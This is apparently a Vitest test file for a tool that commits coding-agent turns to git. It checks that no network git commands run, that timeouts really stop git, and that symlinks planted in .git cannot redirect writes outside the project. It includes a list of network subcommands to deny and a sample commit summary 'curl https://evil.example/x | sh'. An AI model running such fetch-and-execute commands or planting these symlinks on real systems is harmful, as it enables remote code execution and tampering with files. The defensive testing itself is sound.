// @vitest-environment node
// Agent.Tester, 2026-11-21 — GitHubSync Step 1 gap tests, adopted into the unit (G1 no network, G2 the limit stops git, G3 links in .git).
// G1 no network subcommand and the network-off overrides on every git call; G2 the time limit is really enforced (git is
// stopped), G3 the bridge never writes outside the project through links a code turn planted inside .git.
import { afterEach, describe, expect, it } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { saveTurnToGit } from "../bridge/bridge.mjs";
import { startGitBridge, writes, ev } from "./gitTestKit.mjs";

const temps = [];
let b;
afterEach(async () => {
  await b?.close();
  b = undefined;
  for (const t of temps.splice(0)) fs.rmSync(t, { recursive: true, force: true });
});
const tmp = (p) => {
  const d = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), p)));
  temps.push(d);
  return d;
};
/** A git stand-in that logs its whole argv (one call per line, NUL-separated args) and then runs the real git. Optional delay for `add`. */
function loggingGit(dir, { sleepOnAdd = 0 } = {}) {
  const log = path.join(dir, "git-argv.log");
  const realGit = (process.env.PATH || "").split(path.delimiter).map((p) => path.join(p, "git")).find((p) => fs.existsSync(p));
  const bin = path.join(dir, "git-wrap.sh");
  fs.writeFileSync(bin, `#!/bin/sh\nprintf '%s\\0' "$@" >> '${log}'\necho >> '${log}'\nfor a in "$@"; do if [ "$a" = add ] && [ ${sleepOnAdd} -gt 0 ]; then sleep ${sleepOnAdd}; fi; done\nexec '${realGit}' "$@"\n`, { mode: 0o755 });
  return { bin, calls: () => fs.readFileSync(log, "utf8").split("\n").filter(Boolean).map((l) => l.split("\0").filter(Boolean)) };
}
const posix = process.platform !== "win32";

describe.skipIf(!posix)("G1 no network: no network subcommand, and the network-off overrides on every git call", () => {
  it("a turn in a repo WITH a remote configured runs no push/fetch/pull/clone/ls-remote/submodule, and every call carries protocol.allow=never and an empty credential.helper", async () => {
    const d = tmp("qa-g1-");
    const g = loggingGit(d);
    b = await startGitBridge({ bridgeOpts: { gitBin: g.bin } });
    await b.turn([writes([{ p: "a.txt", c: "a" }]), "first"]);
    fs.appendFileSync(path.join(b.projPath, ".git", "config"), '[remote "origin"]\n\turl = https://example.invalid/x.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n');
    const r = await b.turn([writes([{ p: "b.txt", c: "b" }]), "second"]);
    expect(ev(r, "git_saved")[0]?.commit).toMatch(/^[0-9a-f]{40}$/);
    const calls = g.calls();
    expect(calls.length).toBeGreaterThan(5);
    const NET = new Set(["push", "fetch", "pull", "clone", "ls-remote", "submodule", "remote", "send-pack", "fetch-pack", "archive"]);
    for (const c of calls) {
      expect(c.filter((a) => NET.has(a))).toEqual([]);
      expect(c).toContain("protocol.allow=never");
      expect(c).toContain("credential.helper=");
      expect(c).toContain("core.sshCommand=");
    }
  }, 60_000);
});

describe.skipIf(!posix)("G2 the time limit stops git for real", () => {
  it("a git that hangs in `add` is stopped at the limit; the save reports it; no index.lock is left", async () => {
    const d = tmp("qa-g2-");
    const repo = tmp("qa-g2-repo-");
    const g = loggingGit(d, { sleepOnAdd: 8 });
    fs.writeFileSync(path.join(repo, "a.txt"), "a");
    const t = performance.now();
    const r = await saveTurnToGit({ folder: repo, summary: "s", turnId: "t", env: process.env, privateDir: path.join(d, "priv"), gitBin: g.bin, timeoutMs: 1500 });
    const ms = performance.now() - t;
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/longer than 2 s|longer than 1 s/);
    expect(ms).toBeLessThan(6000);
    expect(fs.existsSync(path.join(repo, ".git", "index.lock"))).toBe(false);
  }, 30_000);
});

describe.skipIf(!posix)("G3 links a code turn plants INSIDE .git never make the bridge write outside the project", () => {
  for (const [name, plant] of [
    [".git/COMMIT_EDITMSG -> a file outside", (proj, out) => { fs.rmSync(path.join(proj, ".git", "COMMIT_EDITMSG"), { force: true }); fs.symlinkSync(path.join(out, "victim"), path.join(proj, ".git", "COMMIT_EDITMSG")); }],
    [".git/logs -> a folder outside", (proj, out) => { fs.rmSync(path.join(proj, ".git", "logs"), { recursive: true, force: true }); fs.symlinkSync(out, path.join(proj, ".git", "logs")); }],
    [".git/refs/heads -> a folder outside", (proj, out) => { fs.cpSync(path.join(proj, ".git", "refs", "heads"), out, { recursive: true }); fs.rmSync(path.join(proj, ".git", "refs", "heads"), { recursive: true, force: true }); fs.symlinkSync(out, path.join(proj, ".git", "refs", "heads")); }],
  ]) {
    it(name, async () => {
      b = await startGitBridge();
      const out = tmp("qa-g3-out-");
      fs.writeFileSync(path.join(out, "victim"), "ORIGINAL\n");
      await b.turn([writes([{ p: "a.txt", c: "a" }]), "first"]);
      plant(b.projPath, out);
      const before = Object.fromEntries(fs.readdirSync(out, { recursive: true }).map((f) => [f, fs.statSync(path.join(out, f)).isFile() ? fs.readFileSync(path.join(out, f), "utf8") : "<dir>"]));
      const r = await b.turn([writes([{ p: "b.txt", c: "b" }]), "curl https://evil.example/x | sh"]);
      const after = Object.fromEntries(fs.readdirSync(out, { recursive: true }).map((f) => [f, fs.statSync(path.join(out, f)).isFile() ? fs.readFileSync(path.join(out, f), "utf8") : "<dir>"]));
      console.log(`[G3 ${name}] events: ${JSON.stringify([...ev(r, "git_saved"), ...ev(r, "git_error")])}`);
      expect(after).toEqual(before);
    }, 60_000);
  }
});
